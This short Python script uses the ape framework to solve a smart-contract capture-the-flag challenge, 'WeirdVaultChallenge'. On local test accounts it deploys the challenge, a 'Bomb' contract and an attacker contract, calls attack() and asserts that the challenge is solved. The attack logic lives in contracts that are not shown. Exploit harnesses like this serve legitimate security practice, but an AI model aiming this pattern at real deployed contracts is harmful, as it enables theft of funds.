from ape import accounts, project


def main():
    # --- BEFORE EXPLOIT --- #
    print("\n--- Setting up scenario ---\n")

    # get accounts
    deployer = accounts.test_accounts[0]
    attacker = accounts.test_accounts[1]

    # deploy challenge contract
    print("\n--- Deploying Challenge ---\n")
    challenge = project.WeirdVaultChallenge.deploy(sender=deployer)

    # --- EXPLOIT GOES HERE --- #
    print("\n--- Initiating exploit... ---\n")

    # exploit
    bomb = project.Bomb.deploy(sender=attacker)
    attacker_contract = project.WeirdVaultAttacker.deploy(
        challenge.address,
        bomb.address,
        sender=attacker,
        value=1,
    )
    attacker_contract.attack(sender=attacker)

    # --- AFTER EXPLOIT --- #

    assert challenge.isSolved()

    print("\n--- 🥂 Challenge Completed! 🥂 ---\n")


if __name__ == "__main__":
    main()
